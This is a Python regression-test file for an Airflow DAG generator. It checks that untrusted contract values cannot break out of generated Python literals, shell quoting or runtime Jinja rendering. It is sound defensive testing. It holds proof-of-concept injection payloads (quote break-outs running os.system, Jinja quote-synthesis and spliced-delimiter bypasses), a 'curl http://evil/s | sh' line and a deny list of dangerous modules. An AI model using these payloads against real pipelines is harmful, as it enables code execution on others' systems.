# Copyright 2024-2026 Agentics Transformation Ltd
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Regression tests: untrusted contract values must not be able to inject code
into generated Airflow DAG Python files.

A generated DAG is *executed* by Airflow when it parses the file, so any
contract value that is interpolated into the generated source — a ``taskId``,
``sql``/``query``, ``bucket``, ``name``, ``timezone``, ``schedule``, a
``dependsOn`` edge — must be emitted as an escaped Python literal
(``py_str_literal``) or a sanitised identifier (``sanitize_identifier``), never
wrapped in hand-written quotes.

These tests are mechanism-agnostic: rather than asserting a particular escaping
they parse the generated source and assert (1) it is syntactically valid and
(2) the AST contains no executable call to ``os.system``/``exec``/``eval``/
``__import__`` and no import of ``os``/``subprocess`` — i.e. the payload, if
present, survives only as inert string data.
"""

from __future__ import annotations

import ast
import shlex

import pytest

# The exact PoC payload from the vulnerability report: a triple-quote that
# would close a ``sql=\"\"\"...\"\"\"`` literal, then a top-level os.system call.
POC_SQL = 'SELECT 1"""\nimport os; os.system("touch /tmp/PWNED")\nx="""'
# Single-quote break-out + newline + statement.
POC_SQUOTE = "x'; import os; os.system('touch /tmp/PWNED2')\ny='"
# A taskId / identifier carrying a newline + statement (LHS / dependency vector).
POC_IDENT = "t_evil\nimport os; os.system('touch /tmp/PWNED3')\nx = "

_DANGEROUS_CALLS = {"system", "popen", "exec", "eval", "__import__", "spawn", "Popen"}
_DANGEROUS_MODULES = {"os", "subprocess", "sys", "shutil", "socket"}


def assert_inert(code: str) -> ast.Module:
    """Assert ``code`` parses and contains no injected executable construct."""
    tree = ast.parse(code)  # raises SyntaxError if a payload broke out
    offenders = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            name = getattr(node.func, "id", None) or getattr(node.func, "attr", None)
            if name in _DANGEROUS_CALLS:
                offenders.append(f"call:{name}")
        if isinstance(node, ast.Import):
            offenders.extend(
                f"import:{a.name}" for a in node.names if a.name.split(".")[0] in _DANGEROUS_MODULES
            )
        if (
            isinstance(node, ast.ImportFrom)
            and (node.module or "").split(".")[0] in _DANGEROUS_MODULES
        ):
            offenders.append(f"from:{node.module}")
    assert not offenders, f"code injection: generated DAG executes {offenders}\n---\n{code}"
    return tree


# ---------------------------------------------------------------------------
# Primitives
# ---------------------------------------------------------------------------


def test_py_str_literal_neutralises_breakouts():
    from fluid_build.providers.common.codegen_utils import py_str_literal

    for payload in (POC_SQL, POC_SQUOTE, "a'b", 'a"b', "a\nb", "a\\b", '"""', "''''"):
        literal = py_str_literal(payload)
        # The literal must eval back to exactly the original (round-trip) and be
        # a single expression — proving it cannot contain an executable stmt.
        assert ast.literal_eval(literal) == payload
    # None / non-str are coerced, never emitted as a raw object repr.
    assert py_str_literal(None) == "''"
    assert ast.literal_eval(py_str_literal(123)) == "123"


def test_escape_for_docstring_cannot_close_docstring():
    from fluid_build.providers.common.codegen_utils import escape_for_docstring

    escaped = escape_for_docstring('x"""\nimport os; os.system("p")\ny')
    wrapped = '"""\n' + escaped + '\n"""'
    assert_inert(wrapped)


def test_sanitize_identifier_is_always_a_legal_name():
    from fluid_build.providers.common.codegen_utils import sanitize_identifier

    for payload in (POC_IDENT, "a-b", "a.b", "a b", "1abc", "", "../../x", "a';b"):
        assert sanitize_identifier(payload).isidentifier()


# ---------------------------------------------------------------------------
# Main provider-aware scheduler (fluid_build/schedulers/airflow)
# ---------------------------------------------------------------------------


def _malicious_contract(action_prefix: str, params_key: str) -> dict:
    return {
        "id": POC_SQUOTE,
        "name": POC_SQL,
        "orchestration": {
            "schedule": "0 2 * * *",
            "timezone": POC_SQUOTE,
            "tasks": [
                {
                    "taskId": POC_IDENT,
                    "type": "provider_action",
                    "action": f"{action_prefix}.query",
                    "params": {params_key: POC_SQL, "bucket": POC_SQL, "query": POC_SQL},
                },
                {
                    "taskId": "t2",
                    "type": "provider_action",
                    "action": f"{action_prefix}.query",
                    "params": {params_key: "SELECT 2"},
                    "dependsOn": [POC_IDENT],
                },
            ],
        },
    }


@pytest.mark.parametrize(
    "provider,prefix",
    [("snowflake", "sf.snowflake"), ("gcp", "gcp.bigquery"), ("aws", "aws.athena")],
)
def test_main_scheduler_provider_tasks_are_injection_safe(provider, prefix):
    from fluid_build.schedulers.airflow import AirflowScheduler

    contract = _malicious_contract(prefix, "sql")
    out = AirflowScheduler().generate(contract, provider=provider)
    (code,) = out.values()
    assert_inert(code)
    assert "touch /tmp/PWNED" in code  # payload preserved as inert data


def test_main_scheduler_exact_poc_defeated():
    """The exact report PoC: snowflake sql triple-quote break-out."""
    from fluid_build.schedulers.airflow import AirflowScheduler

    contract = {
        "id": "p",
        "name": "p",
        "orchestration": {
            "tasks": [
                {
                    "taskId": "t1",
                    "type": "provider_action",
                    "action": "sf.snowflake.query",
                    "params": {"sql": POC_SQL},
                }
            ]
        },
    }
    (code,) = AirflowScheduler().generate(contract, provider="snowflake").values()
    assert_inert(code)


# ---------------------------------------------------------------------------
# Provider-local generators
# ---------------------------------------------------------------------------


def test_gcp_codegen_is_injection_safe():
    from fluid_build.providers.gcp.codegen.airflow import generate_airflow_dag

    contract = {
        "id": POC_SQUOTE,
        "name": POC_SQL,
        "orchestration": {
            "timezone": POC_SQUOTE,
            "tasks": [
                {
                    "taskId": POC_IDENT,
                    "type": "provider_action",
                    "action": "gcp.bigquery.query",
                    "params": {"query": POC_SQL},
                },
                {
                    "taskId": "t_gcs",
                    "type": "provider_action",
                    "action": "gcp.gcs.create_bucket",
                    "params": {"bucket": POC_SQL},
                    "dependsOn": [POC_IDENT],
                },
                {
                    "taskId": "t_flow",
                    "type": "provider_action",
                    "action": "gcp.dataflow.run_template",
                    "params": {"template": POC_SQL, "job_name": POC_SQL},
                },
                {
                    "taskId": "t_py",
                    "type": "provider_action",
                    "action": "gcp.unknown.thing",
                    "params": {"anything": POC_SQL},
                },
            ],
        },
    }
    assert_inert(generate_airflow_dag(contract, "my-project", "us-central1"))


def test_snowflake_codegen_is_injection_safe():
    from fluid_build.providers.snowflake.codegen.airflow import generate_airflow_dag

    contract = {
        "id": POC_SQUOTE,
        "name": POC_SQL,
        "orchestration": {
            "timezone": POC_SQUOTE,
            "tasks": [
                {
                    "taskId": POC_IDENT,
                    "type": "provider_action",
                    "action": "sf.snowflake.query",
                    "params": {"sql": POC_SQL, "warehouse": POC_SQL, "database": POC_SQL},
                },
                {
                    "taskId": "t2",
                    "type": "provider_action",
                    "action": "sf.snowflake.query",
                    "params": {"sql": "SELECT 2"},
                    "dependsOn": [POC_IDENT],
                },
            ],
        },
    }
    assert_inert(generate_airflow_dag(contract, account=POC_SQUOTE, database=POC_SQL))


# ---------------------------------------------------------------------------
# Shared header builder
# ---------------------------------------------------------------------------


def test_generate_file_header_docstring_is_injection_safe():
    from fluid_build.providers.common.codegen_utils import generate_file_header

    header = generate_file_header(
        contract_id='x"""\nimport os; os.system("p")\ny',
        contract_name='n"""\nexec("evil")\nz',
        provider="gcp",
        schedule=POC_SQL,
        timezone=POC_SQUOTE,
    )
    # Header is a bare docstring; wrap it in a module to parse.
    assert_inert(header + "\npass\n")


# ---------------------------------------------------------------------------
# Benign output is unchanged (no false-positive churn)
# ---------------------------------------------------------------------------


def test_benign_contract_still_produces_expected_operators():
    from fluid_build.schedulers.airflow import AirflowScheduler

    contract = {
        "id": "sales",
        "name": "Sales Pipeline",
        "orchestration": {
            "tasks": [
                {
                    "taskId": "load",
                    "type": "provider_action",
                    "action": "sf.snowflake.query",
                    "params": {"sql": "SELECT 1"},
                },
            ]
        },
    }
    (code,) = AirflowScheduler().generate(contract, provider="snowflake").values()
    assert_inert(code)
    assert "load = SnowflakeOperator(" in code
    assert "sql='SELECT 1'" in code
    assert "task_id='load'" in code


# ---------------------------------------------------------------------------
# AirflowDAGGenerator (runtimes/airflow_provider_actions.py)
#
# This generator builds a ``BashOperator`` per providerAction. Every task
# generator previously interpolated contract values straight into
# ``bash_command="{command}"`` inside an f-string, so a quote in any of them
# closed the Python literal and put the rest of the value at module scope --
# executed by Airflow at DAG-parse time. The ``builds[].script`` vector
# (``scheduleTask``) was the sharpest: it is passed through verbatim by design.
# ---------------------------------------------------------------------------


def _dag_from_actions(provider_actions):
    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator

    contract = {
        "id": "test.product.v1",
        "kind": "DataProduct",
        "fluidVersion": "0.7.5",
        "providerActions": provider_actions,
    }
    return AirflowDAGGenerator().generate_dag(contract)


@pytest.mark.parametrize(
    "action,params",
    [
        ("scheduleTask", {"engine": "dbt", "script": POC_SQUOTE, "buildId": "b1"}),
        ("scheduleTask", {"engine": "sql", "script": POC_SQL, "buildId": "b1"}),
        ("scheduleTask", {"engine": "spark", "script": POC_SQUOTE, "buildId": "b1"}),
        ("scheduleTask", {"engine": "dbt", "script": "", "buildId": POC_SQUOTE}),
        ("provisionDataset", {"exposeId": POC_SQUOTE}),
        ("grantAccess", {"principal": POC_SQUOTE, "role": "viewer", "exposeId": "e1"}),
        ("grantAccess", {"principal": "p", "role": POC_SQL, "exposeId": "e1"}),
        ("registerSchema", {"schemaName": POC_SQUOTE}),
        ("createView", {"viewName": POC_SQUOTE}),
        ("custom", {"customAction": POC_SQUOTE}),
    ],
)
def test_provider_action_dag_is_injection_safe(action, params):
    """Every params vector must survive only as inert string data."""
    assert_inert(_dag_from_actions([{"actionId": "a1", "action": action, "params": params}]))


def test_provision_task_gcp_location_is_injection_safe():
    """``binding.location.project``/``dataset`` reach the bq command line."""
    assert_inert(
        _dag_from_actions(
            [
                {
                    "actionId": "a1",
                    "action": "provisionDataset",
                    "provider": "gcp",
                    "params": {
                        "exposeId": "e1",
                        "binding": {"location": {"project": POC_SQUOTE, "dataset": POC_SQL}},
                    },
                }
            ]
        )
    )


def test_action_id_and_depends_on_are_sanitised_identifiers():
    """``actionId`` becomes a Python variable name on both the definition and
    the ``a >> b`` dependency wiring -- a newline there is a statement."""
    assert_inert(
        _dag_from_actions(
            [
                {"actionId": POC_IDENT, "action": "registerSchema", "params": {"schemaName": "s"}},
                {
                    "actionId": "a2",
                    "action": "createView",
                    "params": {"viewName": "v"},
                    "dependsOn": [POC_IDENT],
                },
            ]
        )
    )


def test_description_comment_cannot_escape_into_code():
    """``description`` renders into a ``#`` comment, which a newline ends."""
    assert_inert(
        _dag_from_actions(
            [
                {
                    "actionId": "a1",
                    "action": "custom",
                    "description": "do a thing\nimport os; os.system('touch /tmp/PWNED4')",
                    "params": {},
                }
            ]
        )
    )


def test_schedule_task_emits_select_not_models():
    """``--models`` warns on dbt-core 1.10 and is a hard error on dbt v2."""
    code = _dag_from_actions(
        [
            {
                "actionId": "a1",
                "action": "scheduleTask",
                "params": {"engine": "dbt", "script": "my_model", "buildId": "b1"},
            }
        ]
    )
    assert "--select" in code
    assert "--models" not in code


def test_benign_provider_action_dag_still_renders_operators():
    """The escaping must not break the happy path."""
    code = _dag_from_actions(
        [
            {
                "actionId": "build-orders",
                "action": "scheduleTask",
                "params": {"engine": "dbt", "script": "orders", "buildId": "b1"},
            }
        ]
    )
    tree = assert_inert(code)
    assert "BashOperator" in code
    assert "build_orders = BashOperator" in code
    assert isinstance(tree, ast.Module)


# ---------------------------------------------------------------------------
# The DAG *header* is a second surface: dag_id, description, schedule, kind and
# domain are all contract-derived and land in `DAG(...)` kwargs and a
# triple-quoted docstring.
# ---------------------------------------------------------------------------


def _dag_from_contract(**contract_overrides):
    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator

    contract = {
        "id": "test.product.v1",
        "kind": "DataProduct",
        "fluidVersion": "0.7.5",
        "providerActions": [
            {"actionId": "a1", "action": "registerSchema", "params": {"schemaName": "s"}}
        ],
    }
    contract.update(contract_overrides)
    return AirflowDAGGenerator().generate_dag(contract)


@pytest.mark.parametrize(
    "overrides",
    [
        {"id": POC_SQUOTE},
        {"description": POC_SQL},
        {"description": POC_SQUOTE},
        {"orchestration": {"schedule": POC_SQUOTE}},
        {"kind": POC_SQUOTE},
        {"domain": POC_SQUOTE},
        {"name": POC_SQL},
    ],
)
def test_dag_header_is_injection_safe(overrides):
    assert_inert(_dag_from_contract(**overrides))


def test_empty_dag_header_is_injection_safe():
    """The no-actions placeholder DAG renders dag_id/schedule too."""
    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator

    code = AirflowDAGGenerator().generate_dag(
        {"id": POC_SQUOTE, "kind": "DataProduct", "fluidVersion": "0.7.5"}
    )
    assert_inert(code)


def test_schedule_task_script_is_shell_quoted_not_just_python_inert():
    """`assert_inert` only proves the value cannot escape the *Python* literal.

    The shell layer is separate: the string inside `bash_command` is handed to
    a shell at task runtime, so a `;` in `script` must not start a new command.
    """
    import ast

    code = _dag_from_actions(
        [
            {
                "actionId": "a1",
                "action": "scheduleTask",
                "params": {
                    "engine": "spark",
                    "script": "job.py; curl http://evil/s | sh",
                    "buildId": "b1",
                },
            }
        ]
    )
    tree = assert_inert(code)
    commands = [
        kw.value.value
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        for kw in node.keywords
        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
    ]
    assert commands, "no bash_command found"
    # shlex.quote wraps the whole value, so the `;` is inside quotes.
    assert commands[0] == "'job.py; curl http://evil/s | sh'", commands[0]


# ---------------------------------------------------------------------------
# The RUNTIME layer. `bash_command` is an Airflow `template_field`, so Airflow
# re-renders it as Jinja at TASK runtime -- after generation-time quoting is
# baked in. `shlex.quote` does nothing to `{{ ... }}`, and Jinja string escapes
# can synthesise a quote from a payload containing none, escaping the quoting.
# `assert_inert` cannot see this: it only parses the generated Python.
# ---------------------------------------------------------------------------

#: Renders to a bare `'` without containing one, so shlex.quote has nothing
#: to escape. This is the payload that defeats quoting-only defences.
POC_JINJA_QUOTE = '{{ "\\x27" }}; touch /tmp/FLUID_PWNED; #'

#: Same attack, but the delimiters are SPLICED: a single non-overlapping
#: `re.sub` pass that removes two-character Jinja delimiters rejoins the
#: survivors into new ones -- `{}}{` -> `{{` and `}{{}` -> `}}` -- so the
#: payload arrives at the shell with live Jinja. This defeats a
#: delimiter-matching strip; only stripping braces themselves survives it.
POC_JINJA_SPLICED = '{}}{ "\\x27" }{{}; touch /tmp/FLUID_PWNED; #'


def _bash_commands(code):
    """Every `bash_command=` value in the generated DAG, as Python sees it."""
    return [
        kw.value.value
        for node in ast.walk(ast.parse(code))
        if isinstance(node, ast.Call)
        for kw in node.keywords
        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
    ]


def _render_like_airflow(command: str) -> str:
    """Render as Airflow does, with a hostile DAG object in context."""
    sandbox = pytest.importorskip("jinja2.sandbox")

    class _Dag:
        description = "'; touch /tmp/FLUID_PWNED_VIA_DAG; #"
        dag_id = "d"

    class _Var:
        """Stands in for Airflow's `var.value.<key>` accessor."""

        value = type("V", (), {"__getattr__": lambda self, k: "resolved-" + k})()

    env = sandbox.SandboxedEnvironment()
    return env.from_string(command).render(dag=_Dag(), var=_Var())


@pytest.mark.parametrize(
    "params",
    [
        {"exposeId": POC_JINJA_QUOTE},
        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_QUOTE, "dataset": "d"}}},
        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_QUOTE}}},
        {"exposeId": "{{ dag.description }}"},
        # Spliced variants -- these pass against a brace strip and FAIL
        # against a delimiter-matching strip.
        {"exposeId": POC_JINJA_SPLICED},
        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_SPLICED, "dataset": "d"}}},
        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_SPLICED}}},
    ],
)
def test_contract_value_cannot_inject_via_runtime_jinja_render(params):
    """After Airflow's render, the shell must still see one inert token."""
    code = _dag_from_actions(
        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": params}]
    )
    for command in _bash_commands(code):
        rendered = _render_like_airflow(command)
        # The payload must not have escaped into a second shell command.
        assert "touch /tmp/FLUID_PWNED" not in shlex.split(rendered), rendered
        for token in shlex.split(rendered):
            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"


def test_schedule_task_script_cannot_inject_via_runtime_jinja_render():
    code = _dag_from_actions(
        [
            {
                "actionId": "a1",
                "action": "scheduleTask",
                "params": {"engine": "dbt", "script": POC_JINJA_QUOTE, "buildId": "b1"},
            }
        ]
    )
    for command in _bash_commands(code):
        rendered = _render_like_airflow(command)
        assert shlex.split(rendered)[:3] == ["dbt", "run", "--select"], rendered
        assert len(shlex.split(rendered)) == 4, f"escaped the quoting: {rendered}"


def test_generator_authored_jinja_defaults_still_render():
    """The fix must not break the generator's own `{{ var.value.* }}`."""
    code = _dag_from_actions(
        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": {}}]
    )
    assert any("var.value.gcp_project" in c for c in _bash_commands(code))


@pytest.mark.parametrize("payload", [POC_JINJA_QUOTE, POC_JINJA_SPLICED])
@pytest.mark.parametrize(
    "action,params_key",
    [
        ("registerSchema", "schemaName"),
        ("createView", "viewName"),
        ("grantAccess", "principal"),
        ("grantAccess", "role"),
        ("scheduleTask", "buildId"),
        ("scheduleTask", "script"),
    ],
)
def test_every_bash_command_site_resists_runtime_jinja(action, params_key, payload):
    """Every command-building branch, both payload shapes.

    `scheduleTask`+`buildId` covers the else-branch that once used bare
    `shlex.quote` instead of `_sh`; the spliced payload covers the
    delimiter-rejoin bypass.
    """
    params = {"engine": "python", params_key: payload}
    code = _dag_from_actions([{"actionId": "a1", "action": action, "params": params}])
    for command in _bash_commands(code):
        rendered = _render_like_airflow(command)
        for token in shlex.split(rendered):
            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"
